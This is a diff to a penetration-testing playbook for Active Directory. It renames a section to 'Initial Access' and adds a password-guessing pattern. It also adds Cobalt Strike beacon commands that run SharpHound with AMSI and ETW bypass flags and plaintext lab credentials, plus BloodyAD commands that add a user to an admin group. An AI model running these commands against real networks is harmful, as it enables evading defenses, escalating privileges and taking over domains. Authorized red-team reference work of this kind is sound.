@@ -4,7 +4,7 @@
 1. Utilities
 2. Resources
 3. Reconnaissance
-4. Exploitation
+4. [Initial Access](#4-initial-access)
 5. Post Exploitation
 6. Lateral Movement
 7. Full Control
@@ -249,6 +249,7 @@ Common patterns:
 - MonthYear
 - SeasonYear
 - DayDate
+- OrgName123!
 
 #### Address Generation
 
@@ -300,7 +301,7 @@ Depending on office version, verify valid accounts with `auxiliary/scanner/http/
 
 ---
 
-## 4. Exploitation
+## 4. Initial Access
 
 ### Delivery
 
@@ -1292,10 +1293,7 @@ awk -F '\t' '{print $3 " " $9}' domain_users.grep | grep -Ev 'sAMAccountName use
 beacon> execute-assembly /opt/tools/SharpHound.exe -c All,GpoLocalGroup -d vault.local
 
 # stealth
-beacon> execute-assembly c:\tools\sharphound3.exe -c DcOnly --Stealth --RandomizeFilenames
-
-# download
-beacon> download .\20210210043130_BloodHound.zip
+beacon> execute-assembly --amsi-bypass --etw-bypass --in-process --timeout 1800 /opt/tools/SharpHound.exe -- -c DCOnly --ldapusername financeuser --ldappassword F1n@nc3! --randomfilenames --zippassword P@ssword1
 ```
 
 bloodhound-python
@@ -1310,7 +1308,7 @@ proxychains bloodhound-python -u pentest -p 'Corp123!' -d vault.local -ns 10.8.4
 
 See n00py's [notes](./read/noopy1-favorite-bloodhound-tips.md) for more coverage.
 
-### Resources
+##### Resources
 - https://github.com/BloodHoundAD/SharpHound3
 - https://github.com/fox-it/BloodHound.py
 - https://github.com/hausec/Bloodhound-Custom-Queries
@@ -1340,7 +1338,7 @@ MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
 MATCH (n:Computer {haslaps:false}) RETURN n.name
 ```
 
-#### Powershell
+### Powershell
 
 ```
 # check constrained language mode
@@ -1513,11 +1511,21 @@ Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? { ($_.ObjectT
 Get-ObjectACL -DistinguishedName "dc=companyx,dc=com" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') } | select IdentityReference
 ```
 
-### Resources
+#### Resources
 - [0xe7/PowerSploit - Active Fork](https://github.com/0xe7/PowerSploit)
 - https://powersploit.readthedocs.io/en/latest/Recon/
 - https://github.com/tevora-threat/SharpView
 - https://github.com/HunnicCyber/SharpSniper
+
+### BloodyAD
+
+```
+# get attributes
+$ bloodyAD -d vault.local -u somadmin -p 'ArchN3mi' --host 10.10.14.120 getObjectAttributes anotheradmin
+
+# add object to group
+$ bloodyAD -d vault.local -u somadmin -p 'ArchN3mi' --host 10.10.14.120 addObjectToGroup somadmin 'VAULT.SERVER.ADMINS'
+```
 
 ### Host Recon
 
